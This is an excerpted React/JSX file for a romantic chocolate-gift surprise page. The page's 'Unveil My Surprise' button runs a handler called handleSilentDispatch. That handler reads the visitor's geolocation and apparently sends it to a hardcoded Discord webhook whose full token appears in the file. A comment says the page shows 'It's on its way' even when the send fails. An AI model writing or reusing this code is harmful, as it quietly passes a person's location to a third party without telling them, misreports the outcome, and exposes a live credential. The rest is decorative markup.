...
// Using the hardcoded Discord Webhook you provided to avoid process.env errors
const MY_SECRET_WEBHOOK_URL = "https://discord.com/api/webhooks/1470070091902222603/z3L9d-kbr5aw8v3vQEIzSk5M7lHLwe73ius1_juQR2c-_xjTV8szU8v4lBVEPnUX921_"; 
    ...
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        ...
        try {
          ...
          // If fetch fails (CORS or other), we still show success to the user so we don't ruin the moment
          setDispatchStatus('dispatched'); 
        }
      },
      (error) => {
  ...
  return (
    <div className="min-h-screen bg-[#0F0805] text-[#FEFAE0] selection:bg-amber-500 selection:text-black transition-opacity duration-1000">
      <div className="fixed inset-0 pointer-events-none -z-10 overflow-hidden">
        ...
        {[...Array(15)].map((_, i) => (
          <div key={i} className="absolute animate-float bg-amber-500/5 rounded-full blur-[80px]" style={{ top: `${Math.random() * 100}%`, left: `${Math.random() * 100}%`, width: `${Math.random() * 200 + 100}px`, height: `${Math.random() * 200 + 100}px`, animationDelay: `${Math.random() * 5}s`, animationDuration: `${15 + Math.random() * 10}s` }} />
        ))}
      </div>
      ...
      <section className="min-h-screen flex flex-col items-center justify-center relative px-6 overflow-hidden">
        ...
        <div className={`relative z-10 text-center space-y-10 transition-all duration-[1.5s] ease-out transform ${isVisible ? 'translate-y-0 opacity-100' : 'translate-y-12 opacity-0'}`}>
          ...
          <p className="max-w-[280px] md:max-w-lg mx-auto text-amber-100/40 font-light tracking-widest text-sm md:text-xl italic leading-relaxed">A bespoke collection of pralines, <br/> crafted specifically for you.</p>
          <div className="pt-8">
            <button onClick={() => scrollToSection('box-section')} className="group relative px-10 py-5 overflow-hidden rounded-full border border-amber-500/10 transition-all active:scale-95 shadow-2xl backdrop-blur-sm">
      ...
      <section className="py-24 md:py-40 px-4">
        <div className="reveal max-w-4xl mx-auto glass p-10 md:p-32 rounded-[3rem] md:rounded-[5rem] text-center space-y-10 shadow-2xl relative overflow-hidden">
          ...
          <div className="flex flex-col items-center gap-4">
            <button onClick={handleNextQuote} disabled={isQuoteChanging} className="group px-6 py-2 text-amber-500/40 hover:text-amber-400 disabled:opacity-30 transition-all uppercase tracking-[0.4em] text-[10px] font-bold relative">
      ...
      <section className="py-24 md:py-40 px-6 pb-48 relative overflow-hidden">
        ...
        <div className="reveal max-w-4xl mx-auto glass p-10 md:p-24 rounded-[3rem] md:rounded-[4rem] text-center space-y-12 shadow-2xl relative z-10">
          <div className="space-y-4">
            ...
            <p className="text-amber-100/60 font-romantic text-2xl md:text-4xl max-w-md mx-auto leading-relaxed px-4">Please click the button below to trigger your surprise</p>
          </div>
          <div className="relative">
            <div className={`w-44 h-44 md:w-60 md:h-60 mx-auto rounded-full border border-amber-500/10 flex items-center justify-center relative transition-all duration-1000 ${dispatchStatus === 'preparing' ? 'animate-spin-rapid border-amber-500/50 shadow-[0_0_80px_rgba(212,175,55,0.4)]' : 'pulse-gold'}`}>
              <div className={`text-6xl md:text-8xl transition-all duration-1000 transform ${dispatchStatus === 'dispatched' ? 'scale-125 rotate-12 filter drop-shadow-[0_0_30px_rgba(212,175,55,0.8)]' : 'opacity-80'}`}>{dispatchStatus === 'dispatched' ? '💖' : '🎁'}</div>
            </div>
            <div className="mt-12 space-y-8">
              {dispatchStatus === 'idle' && (
                <button onClick={handleSilentDispatch} className="group px-12 py-6 bg-amber-500/5 border border-amber-500/20 text-amber-500 rounded-full hover:bg-amber-500 hover:text-black transition-all font-bold tracking-[0.4em] uppercase text-[10px] shadow-2xl active:scale-95">Unveil My Surprise</button>
              )}
              {dispatchStatus === 'preparing' && <div className="text-amber-400 font-romantic text-3xl animate-pulse">Syncing heartbeats...</div>}
              {dispatchStatus === 'dispatched' && (
                <div className="space-y-6 animate-in fade-in zoom-in duration-1000">
                  <h3 className="text-amber-50 font-romantic text-4xl md:text-7xl leading-tight">It's on its way, my love.</h3>
                </div>
              )}
              {dispatchStatus === 'error' && <button onClick={() => setDispatchStatus('idle')} className="text-amber-500 text-[9px] uppercase tracking-widest font-bold">Try Again (Enable Location)</button>}
            </div>
          </div>
        </div>
      </section>
        ...
        <div className={`fixed inset-0 z-[100] flex items-center justify-center p-4 md:p-20 bg-black/98 backdrop-blur-3xl transition-all duration-700 ${isClosing ? 'opacity-0' : 'opacity-100'}`}>
          <div className="max-w-5xl w-full grid md:grid-cols-2 gap-10 md:gap-16 items-center overflow-y-auto max-h-[90vh] px-4">
            <div className="flex flex-col items-center">
              <div className="text-[10rem] md:text-[20rem] animate-float">{selectedChoco.emoji}</div>
            </div>
            <div className="space-y-8">
              <h3 className="text-5xl md:text-8xl font-serif text-amber-200 italic">{selectedChoco.name}</h3>
              <p className="text-amber-100/40 text-lg md:text-xl font-light">{selectedChoco.description}</p>
              <div className="p-8 bg-white/[0.02] rounded-[2.5rem] italic"><p className="text-2xl md:text-4xl font-romantic text-amber-100/80 leading-relaxed text-center">"{selectedChoco.note}"</p></div>
              <button onClick={closeModal} className="w-full py-5 border border-amber-500/20 text-amber-500 rounded-full tracking-[0.4em] font-bold text-[10px] uppercase">BACK TO BOX</button>
            </div>
          </div>
        </div>
      )}
